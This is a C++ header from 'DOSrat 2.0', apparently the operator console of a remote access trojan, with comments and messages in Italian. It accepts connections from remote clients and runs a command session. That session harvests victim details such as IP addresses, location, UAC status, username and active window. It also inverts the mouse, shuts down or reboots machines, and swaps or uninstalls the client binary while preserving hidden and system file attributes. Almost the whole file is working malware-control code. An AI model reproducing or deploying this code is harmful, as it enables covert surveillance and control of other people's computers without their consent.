#pragma once

void StampaTitolo(short Returns = 0)
{
    TextColor tc;
    tc.SetColor(tc.Green);

    cout << "  ______  _______ ______                      ______    _____  " << endl;
    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
    cout << "| Versione [" << Version << "]" << endl;
    cout << "| DOSrat 2.0 by Criper98" << endl;

    for (int i = 0; i < Returns; i++)
        cout << endl;

    tc.SetColor(tc.Default);
}

void StampaPrefix(string NomeClient = "")
{
    TextColor tc;

    tc.SetColor(tc.Yellow);

    cout << "DOSrat 2.0";

    if (NomeClient != "")
    {
        tc.SetColor(tc.Default);
        cout << " [";
        tc.SetColor(tc.Purple);
        cout << NomeClient;
        tc.SetColor(tc.Default);
        cout << "]";
    }

    tc.SetColor(tc.Default);
    cout << "> ";
}

void StampaHelp(string Cmd, string Desc)
{
    ConsoleUtils cu;
    COORD Cpos;
    COORD Csize = cu.GetConsoleSize();

    cout << Cmd;

    Cpos = cu.GetCursorPos();

    if (Desc.size() < Csize.X - Cpos.X)
    {
        cout << Desc << endl;
        return;
    }

    for (int i = 0; i < Desc.size(); i++)
    {
        if (cu.GetCursorPos().X == Csize.X - 1)
        {
            cout << endl;
            Cpos.Y++;
            cu.SetCursorPos({ Cpos.X, Cpos.Y });
        }

        cout << Desc[i];
    }

    cout << endl;
}

bool AutoAggiornamento()
{
    GitHub gh;
    DirUtils du;
    SystemUtils su;

    if (!du.CheckDir(du.GetModuleFilePath() + "Update"))
        du.MakeDir(du.GetModuleFilePath() + "Update");

    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", du.GetModuleFilePath() + "Update\\"))
        return false;

    su.NoOutputCMD("PowerShell Expand-Archive '" + du.GetModuleFilePath() + "Update\\DOSrat2.0.zip' '" + du.GetModuleFilePath() + "Update' -force");

    du.DelFile(du.GetModuleFilePath() + "Update\\DOSrat2.0.zip");

    if(!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\DOSrat 2.0.exe\", \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\Build\\Client.exe\", \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nWshShell.Run \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
        return false;

    su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");

    return true;
}

void VerificaAggiornamenti(bool AutoUpdate)
{
    GitHub gh;
    EasyMSGB msgb;
    SystemUtils su;

    string CurrTag = gh.GetRepoTag("criper98", "dosrat-2.0");

    if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
    {
        if (AutoUpdate)
        {
            if (AutoAggiornamento())
                exit(0);
        }
        else
        {
            if (msgb.YesNo("Aggiornamento trovato!\nVuoi andare alla pagina ora?", msgb.Info, "DOSrat 2.0"))
                su.OpenURL("https://github.com/Criper98/DOSrat-2.0/releases/latest");
        }
    }
}

void AccettaConnessioni(TcpIP& Server)
{
    int c = 0;

    while (true)
    {
        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!Clients[i].IsConnected)
            {
                c = i;
                i = MAX_CLIENTS;
            }
        }

        if (Server.WaitConn(Clients[c].sock))
            COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
    }

    return;
}

void VerificaConnessioni()
{
    while (true)
    {
        Sleep(1);

        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!ServerLoopController)
                break;

            if (Clients[i].IsConnected && !Clients[i].InTask)
            {
                char garbage;
                TcpIP::SetTimeout(100, Clients[i].sock);

                int Res = recv(Clients[i].sock, &garbage, 1, MSG_PEEK);

                if (Res == SOCKET_ERROR || Res == 0)
                {
                    Res = WSAGetLastError();
                    //cout << "WSA " << Res << endl;

                    if (Res == 10054 || Res == 0)
                    {
                        closesocket(Clients[i].sock);
                        Clients[i].IsConnected = false;
                        Clu->AggiornaTitolo();
                    }
                }
                TcpIP::SetTimeout(0, Clients[i].sock);
            }
        }
    }

    return;
}

bool CheckConnection(SOCKET Sock, int ID)
{
    TextColor tc;

    if (TcpIP::SendString(Sock, "checkconn"))
    {
        tc.SetColor(tc.Yellow);
        cout << "Errore di connessione temporaneo, riprova." << endl;
        tc.SetColor(tc.Default);

        return true;
    }

    tc.SetColor(tc.Red);
    cout << "Impossibile raggiungere il Client." << endl;
    tc.SetColor(tc.Default);

    closesocket(Sock);
    Clients[ID].IsConnected = false;
    Clu->AggiornaTitolo();

    Sleep(2000);
    return false;
}

bool RestartServer(TcpIP &Server, int Port)
{
    ServerLoopController = false;

    Sleep(1000);

    for (int i = 0; i < MAX_CLIENTS; i++)
        if (Clients[i].IsConnected)
        {
            closesocket(Clients[i].sock);
            Clients[i].IsConnected = false;
        }

    Server.Stop();
    Server.Port = Port;
    if (Server.StartServer() != 0)
        return false;

    Sleep(1000);
    Clu->AggiornaTitolo();

    ServerLoopController = true;

    thread Aconn(AccettaConnessioni, ref(Server));
    thread Vconn(VerificaConnessioni);
    Aconn.detach();
    Vconn.detach();

    return true;
}

// ---------------[ COMANDI CLIENT ]---------------

bool GetInfo(SOCKET Sock, int ID)
{
    json j;
    CLInterface cli;
    VectString Header;
    VectString Body;

    Header.push_back("INFO");
    Header.push_back("VALORE");

    j = COMUNICAZIONI::GetInfo(Sock);

    if (j.dump() == "null")
        return false;

    Body.push_back("IP Wan");
    Body.push_back(Clients[ID].info.IP);

    Body.push_back("IP Lan");
    Body.push_back(j["IPL"]);

    Body.push_back("Nazione");
    Body.push_back(Clients[ID].info.Location.Country);

    Body.push_back("OS");
    Body.push_back(Clients[ID].info.OS);

    Body.push_back("UAC");
    Body.push_back(Clients[ID].info.UAC);

    Body.push_back("Percorso");
    Body.push_back(Clients[ID].info.InstallPath);

    Body.push_back("Versione");
    Body.push_back(Clients[ID].info.Versione);

    Body.push_back("Nome PC");
    Body.push_back(Clients[ID].info.PCname);

    Body.push_back("Nome Utente");
    Body.push_back(Clients[ID].info.UserName);

    Body.push_back("CPU %");
    Body.push_back(j["CPU"]);

    Body.push_back("RAM %");
    Body.push_back(j["RAM"]);

    Body.push_back("Finestra Attiva");
    Body.push_back(j["ACTWIN"]);

    Body.push_back("Data Installazione");
    Body.push_back(j["INSTDATE"]);

    cout << "Informazioni ricevute:" << endl;
    cli.Table(Header, Body);

    return true;
}

bool InvertMouse(SOCKET Sock, int ID)
{
    string Status;

    Status = COMUNICAZIONI::InvertMouse(Sock);

    if (Status == "a")
        cout << "Tasti invertiti." << endl;
    else if (Status == "b")
        cout << "Tasti normali." << endl;
    else
        return false;

    return true;
}

bool Reconnect(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reconnect(Sock))
    {
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool KillClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::KillClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Shutdown(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Shutdown(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Reboot(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reboot(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

short UpdateClient(SOCKET Sock, int ID)
{
    DirUtils du;
    bool Hidden = false;
    bool System = false;
    DWORD Attr;

    string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

    if (FilePath == "")
        return 1;

    Attr = GetFileAttributesA(FilePath.c_str());
    if (Attr != -1)
    {
        Hidden = ((Attr & FILE_ATTRIBUTE_HIDDEN) == FILE_ATTRIBUTE_HIDDEN);
        System = ((Attr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM);
    }

    cout << "Invio file in corso..." << endl;
    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
    {
        cout << "File inviato." << endl;
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return 0;
    }

    return -1;
}

bool Uninstall(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Uninstall(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool RestartClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::RestartClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

void Sessione(int ID, SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string cmd;

    system("cls");
    StampaTitolo(1);
    cli.SubTitle("Sessione Comandi", 60, tc.Green);

    for (bool Controllo = true; Controllo;)
    {
        StampaPrefix(Clients[ID].info.UserName);
        getline(cin, cmd);
        cmd = ToLowerCase(cmd);

        Clients[ID].InTask = true;

        if (cmd == "help")
        {
            cout << endl;
            cli.SubTitle("Client", 20, tc.Blue);
            StampaHelp("Reconnect\t\t", "- Forza il Client a scollegarsi e ricollegarsi a DOSrat ma senza riavviarlo.");
            StampaHelp("Killclient / Kill\t", "- Termina il processo del Client.");
            StampaHelp("Updateclient / Update\t", "- Aggiorna il Client scegliendo l'eseguibile tra i file locali, il Client si riavviera' con il file scelto.");
            StampaHelp("Uninstall\t\t", "- Disinstalla il Client dal computer remoto.");
            StampaHelp("Restartclient / Restart\t", "- Riavvia il Client terminando il processo e riavviandolo.");
            cout << endl;

            cli.SubTitle("System", 20, tc.Lime);
            StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul computer remoto e sul Client.");
            StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse sul computer remoto.");
            StampaHelp("Shutdown\t", "- Spegne il computer remoto.");
            StampaHelp("Reboot\t\t", "- Riavvia il computer remoto.");
            cout << endl;

            cli.SubTitle("Utility", 20, tc.Purple);
            StampaHelp("Exit / Close\t", "- Torna al menu principale.");
            StampaHelp("Clear / Cls\t", "- Pulisce la console da tutti i comandi precedenti.");
            StampaHelp("Help\t\t", "- Mostra la lista dei comandi.");
            cout << endl;
        }
        else if (cmd == "getinfo")
        {
            if (!GetInfo(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "invertmouse")
        {
            if (!InvertMouse(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "exit" || cmd == "close")
        {
            Controllo = false;
        }
        else if (cmd == "reconnect")
        {
            if (!Reconnect(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "clear" || cmd == "cls")
        {
            system("cls");
            StampaTitolo(1);
            cli.SubTitle("Sessione Comandi", 60, tc.Green);
        }
        else if (cmd == "killclient" || cmd == "kill")
        {
            if (!KillClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "shutdown")
        {
            if (!Shutdown(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "reboot")
        {
            if (!Reboot(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "updateclient" || cmd == "update")
        {
            switch (UpdateClient(Sock, ID))
            {
                case -1: Controllo = CheckConnection(Sock, ID); break;
                case 0: Controllo = false; break;
                case 1: break;
            }
        }
        else if (cmd == "uninstall")
        {
            if (!Uninstall(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "restartclient" || cmd == "restart")
        {
            if (!RestartClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else
        {
            cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
        }

        Clients[ID].InTask = false;
    }
}